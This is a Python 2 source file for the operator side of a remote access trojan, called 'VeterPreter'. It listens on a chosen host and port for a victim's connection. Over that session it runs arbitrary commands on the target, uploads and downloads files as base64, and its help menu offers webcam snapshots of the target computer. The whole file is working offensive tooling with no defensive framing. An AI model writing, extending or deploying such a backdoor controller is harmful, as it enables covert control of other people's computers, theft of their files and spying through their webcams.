import socket, json, base64, subprocess
from colorama import Fore

class Listener:
    def __init__(self):
        HOST = raw_input("[+] Please provide LHOST >> ")
        PORT = int(raw_input("[+] Please provide LPORT >> "))
        subprocess.call("clear", shell=True)
        subprocess.call("cls", shell=True)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(((HOST, PORT)))
        IP = HOST
        P = PORT
        print("[+] Listening For Connections on " + str(IP) + " : " + str(P))
        listener.listen(0)
        self.connection, address = listener.accept()

        print(Fore.BLUE + "[+] " + Fore.WHITE + "Session Opened : Connection Established" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024) #getting  1kb of data at a instant of time
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def help(self):
        print(Fore.RED + "[+] upload : Upload files to target computer")
        print(Fore.RED + "[+] download : Download files from target computer")
        print(Fore.RED + "[+] webcam_snap : Start the webcam of the target computer")
        print(Fore.RED + "[+] exit : terminates all sessions")

    def write(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successfull"

    def read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(Fore.WHITE + "\nVeterPreter >> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write(command[1], result)
                if command[0] == "help":
                    result = self.help()
            except Exception:
                result = "[-] Error during command execution"

            print(result)


my_listener = Listener()
my_listener.run()
